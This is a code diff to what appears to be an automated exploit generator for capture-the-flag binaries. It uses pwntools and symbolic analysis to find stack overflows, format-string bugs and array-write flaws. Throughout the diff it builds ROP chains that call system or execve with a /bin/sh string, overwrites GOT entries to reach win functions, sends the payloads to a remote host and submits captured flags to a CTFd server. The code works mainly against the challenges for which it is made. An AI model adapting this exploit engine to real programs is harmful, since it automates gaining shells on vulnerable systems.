@@ -1,9 +1,10 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
 import logging
 import argparse
 import os
 import json
 import requests
+import ctypes
 
 from pwn import *
 from rage.rage import rAEG
@@ -21,6 +22,7 @@ class Aegis:
         self.rop = ROP(self.elf)
 
         self.libc = ELF(libc) if libc != None else self.elf.libc
+
 
         self.ip = ip
         self.port = port
@@ -45,6 +47,8 @@ class Aegis:
         self.symbolic_padding = None
         self.padding = None
         self.failed = False
+        
+        self.array_write = None
 
         self.got_targets = None
 
@@ -53,22 +57,27 @@ class Aegis:
         self.machine.check_mitigations()
         self.machine.check_vulnerable_copy()
         self.machine.check_vulnerable_input()
+        self.array_write = self.machine.check_array_write()
         printf_addrs = self.machine.check_vulnerable_printf()
 
         if len(printf_addrs) > 0:
             self.has_format = True 
             self.got_targets = self.machine.find_target_got_entries(printf_addrs[0])
+        else:
+            self.got_targets = self.machine.get_got_functions("vuln")
+
 
     def symbolic_analysis(self):
         """Set variables from the output of the symbolic analysis."""
-        self.symbol.stack_smash()
-        self.symbolic_padding = self.symbol.symbolic_padding
+        if self.array_write == (None, None):
+            self.symbol.stack_smash()
+            self.symbolic_padding = self.symbol.symbolic_padding
         
-        if not self.has_format:
-            self.has_format = self.symbol.has_format 
+            if not self.has_format:
+                self.has_format = self.symbol.has_format 
 
-        if self.has_format == True:
-            aegis_log.info(f"Found printf format string vulnerability")
+            if self.has_format == True:
+                aegis_log.info(f"Found printf format string vulnerability")
 
     def setup_exploit(self):
         """Choose which exploit to do for the binary."""
@@ -76,6 +85,13 @@ class Aegis:
         self.against.chain = b""
 
         win_gadget = self.machine.find_win_gadget()
+        win_function = None
+
+        if win_gadget != None:
+            win_function = self.machine.bv.get_functions_containing(win_gadget)
+            win_function = win_function[0] if len(win_function) >= 1 else None
+            win_function = win_function.name if win_function != None else None
+        
         function = self.machine.find_functions(["win", "system", "execve", "syscall"])
         string = self.machine.find_string_address()
         writeable = self.machine.find_writeable_address()
@@ -88,64 +104,106 @@ class Aegis:
 
             if self.has_format == True:
                 self.against.format_leak("")
-
                 if self.against.flag == None:
                     if "pwnme" in self.elf.sym.keys(): 
                         self.against.format_write(1337, self.elf.sym["pwnme"])
                         self.exploit()
-                    elif function == "win":
+                    else:
                         got_addr = self.elf.got[self.got_targets[-1]]
-                        self.against.format_write(self.elf.sym["win"], got_addr)
-                        self.exploit()
-                    elif win_gadget:
-                        got_addr = self.elf.got[self.got_targets[-1]]
-                        self.against.format_write(win_gadget, got_addr)
-                        self.exploit()
+                        if function == "win":
+                            self.against.format_write(self.elf.sym["win"], got_addr)
+                            self.exploit()
+                        elif win_gadget:
+                            self.against.format_write(win_gadget, got_addr)
+                            self.exploit()
                 else:
-                    aegis_log.info(f"Found flag through stack leak: {self.against.flag}\nFinding remote flag")
-                    self.against.format_leak("REMOTE")
+                    aegis_log.info(f"Found local flag through stack leak: {self.against.flag}")
+                    self.remote_wait()
 
+                    self.against.format_leak("REMOTE")
                     if self.against.remote_flag != None:
-                        aegis_log.info(f"Found flag through stack leak: {self.against.remote_flag}")
+                        aegis_log.info(f"Found remote flag through stack leak: {self.against.remote_flag}")
                         self.send_flag(self.against.remote_flag)
+                    self.remote_signal()
+            else:
+                got_addr = self.elf.got[self.got_targets[-1]]
+                if self.array_write != (None, None):
+                    index = (got_addr - self.array_write[0]) // self.array_write[1]
+                    rem = (got_addr - self.array_write[0]) % self.array_write[1] 
+
+                    start_addr = self.array_write[0] + index * self.array_write[1]
+                    end_addr = start_addr + self.array_write[1]
+
+                    aegis_log.debug(f"Writing to {hex(got_addr)} with index {index} and {rem}")
+                    aegis_log.debug(f"Start of write {hex(start_addr)}, End of write {hex(end_addr)}")
+
+                    system_plt = self.elf.plt["system"] + 0x6
+                    system_got = self.elf.got["system"]
+                    addr = start_addr
+                    edit = b"" 
+                    size = self.array_write[1]
+                    while size > 0:
+                        if rem == 0:
+                            check = self.elf.sym["win"] & 0xff
+                            if check == 0xa:
+                                edit += p64(self.elf.sym["win"]+1)
+                            else:
+                                edit += p64(self.elf.sym["win"])
+                        elif addr == system_got:
+                            edit += p64(system_plt)
+                        else:
+                            edit += b"A" * 8
+                        rem -= 8
+                        size -= 8
+
+                    self.against.array_exploit = [index, edit]
+                    self.exploit()
 
         else: 
-
-            if win_gadget:
+            if function == "win" or win_function:
+                func = "win" if function == "win" else win_function
+                goal_addr = self.machine.get_goal_addr(func)
+                params = self.machine.find_path(func, goal_addr)
+                print(func)
+                aegis_log.debug(f"Setting up return to win with function with parameters {params}")
+                self.against.chain += self.against.rop_chain_call_function(func, params)
+                self.against.exploit = self.against.padding + self.against.chain
+            elif win_gadget:
                 aegis_log.debug(f"Setting up return to win with gadget")
+                #goal_addr = self.machine.get_goal_addr("win")
+                #params = self.machine.find_path("win", goal_addr)
                 self.against.chain += p64(win_gadget)
                 self.against.exploit = self.against.padding + self.against.chain
 
-            elif function == "win":
-                aegis_log.debug(f"setting up return to win with function")
-                self.against.chain += self.against.rop_chain_call_function(function, [0x1, 0x2, 0x3])
-                self.against.exploit = self.against.padding + self.against.chain
+
 
             elif function == "system":
-                aegis_log.debug(f"Setting up return to system")
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                     self.against.chain += self.against.rop_chain_call_function(function, [writeable])
+                    aegis_log.debug(f"Setting up return to system with parameters {hex(writeable)}")
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string])
-
+                    aegis_log.debug(f"Setting up return to system with parameters {hex(string)}")
                 self.against.exploit = self.against.padding + self.against.chain
             elif function == "execve":
-                aegis_log.debug(f"Setting up return to execve")
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
-                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
+                    self.against.chain += self.against.rop_chain_call_function(function, [writeable, 0, 0])
+                    aegis_log.debug(f"Setting up return to execve with parameters {hex(writeable)}")
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
+                    aegis_log.debug(f"Setting up return to execve with parameters {hex(string)}")
                 self.against.exploit = self.against.padding + self.against.chain
             elif function == "syscall":
-                aegis_log.debug(f"Setting up return to syscall")
 
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                     self.against.chain += self.against.rop_chain_call_function(function, [59, writeable, 0, 0])
+                    aegis_log.debug(f"Setting up return to syscall with paramters {[59, hex(writeable)]}")
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
+                    aegis_log.debug(f"Setting up return to syscall with paramters {[59, hex(string)]}")
                 self.against.exploit = self.against.padding + self.against.chain
             else:
                 if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
@@ -163,6 +221,8 @@ class Aegis:
 
     def send_flag(self, flag):
         """Sends the flag to ctfd service"""
+        if self.ctfd == None:
+            return 
         challenge_url = f"{self.ctfd}/api/v1/challenges/attempt"
         data = json.dumps({"challenge_id" : self.chal_id, "submission" : flag})
         response = requests.post(challenge_url, headers=self.headers, data=data)
@@ -171,6 +231,21 @@ class Aegis:
 
         aegis_log.critical(f"Response from remote server {message} for {flag}")
 
+
+
+    def remote_wait(self):
+        sem = os.getenv("SEM")
+        #print(f"Semaphore Wait Value {os.getenv('SEM')}")
+        while int(sem) <= 0:
+            sleep(1)
+        os.environ["SEM"] = str(int(sem) - 1)
+        #print(f"Semaphore Wait Value {os.getenv('SEM')}")
+            
+    def remote_signal(self):
+        sem = os.getenv("SEM")
+        #print(f"Semaphore Signal Value {os.getenv('SEM')}")
+        os.environ["SEM"] = str(int(sem) + 1)
+        #print(f"Semaphore Signal Value {os.getenv('SEM')}")
 
     def exploit(self):
         """Create and run exploit using Against module."""
@@ -181,7 +256,8 @@ class Aegis:
         if chain_len > 0:
             aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
         else:
-            aegis_log.debug(f"Sending format string payload {self.against.format_exploit} {format_len % 16}")
+            if self.against.format_exploit != None:
+                aegis_log.debug(f"Sending format string payload {self.against.format_exploit} {format_len % 16}")
 
         option = "GDB" if args.GDB else ""
 
@@ -199,19 +275,26 @@ class Aegis:
             self.against.verify_flag()
 
             if self.against.flag != None:
-                    self.against.process = self.against.start("REMOTE")
-                    self.against.send_exploit()                    
-                    aegis_log.debug(f"Sent exploit to remote at {self.ip}")
-                    if self.against.verify_flag() == True:
-                       self.send_flag(self.against.flag) 
+                #self.remote_wait()  
+                self.against.process = self.against.start("REMOTE")
+                self.against.send_exploit()                    
+                aegis_log.debug(f"Sent exploit to remote at {self.ip}")
+                if self.against.verify_flag() == True:
+                    self.send_flag(self.against.flag) 
+
+                #self.remote_signal()
+
+
                                     
         else:
             if self.against.flag != None:
-                    self.against.process = self.against.start("REMOTE")
-                    self.against.send_exploit()
-                    if self.against.verify_flag() == True:
-                       self.send_flag(self.against.flag) 
-                    aegis_log.debug(f"Sent exploit to remote at {self.ip}")
+                #self.remote_wait()
+                self.against.process = self.against.start("REMOTE")
+                self.against.send_exploit()
+                if self.against.verify_flag() == True:
+                    self.send_flag(self.against.flag) 
+                aegis_log.debug(f"Sent exploit to remote at {self.ip}")
+                #self.remote_signal()
 
  
 def print_title():
@@ -280,6 +363,7 @@ def print_title():
 
 if __name__ == "__main__":
     logging.getLogger("angr").setLevel(logging.CRITICAL)
+    #logging.getLogger("angr").setLevel(logging.DEBUG)
     logging.getLogger("os").setLevel(logging.CRITICAL)
     logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
     logging.getLogger("aegis_log").setLevel(logging.DEBUG)
